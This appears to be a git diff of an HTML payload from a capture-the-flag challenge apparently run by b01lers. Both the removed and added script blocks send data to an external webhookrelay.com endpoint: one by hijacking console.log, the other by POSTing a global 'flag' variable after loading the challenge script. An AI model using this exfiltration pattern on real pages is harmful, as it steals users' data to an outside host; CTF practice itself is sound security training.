@@ -1,18 +1,16 @@
-<script>
-	console.log = (...args) => {
-		fetch(
-			"https://bin.webhookrelay.com/v1/webhooks/2067e572-f371-45f3-9ab6-6c253cd918e7",
-			{
-				method: "POST",
-				headers: {
-					"Content-Type": "application/json",
-				},
-				body: JSON.stringify({
-					content: args,
-				}),
-			},
-		);
-	};
-</script>
-
 <script src="https://flag-logger.b01lers.net/index.js"></script>
+
+<script>
+	fetch(
+		"https://bin.webhookrelay.com/v1/webhooks/2067e572-f371-45f3-9ab6-6c253cd918e7",
+		{
+			method: "POST",
+			headers: {
+				"Content-Type": "application/json",
+			},
+			body: JSON.stringify({
+				content: flag,
+			}),
+		},
+	);
+</script>
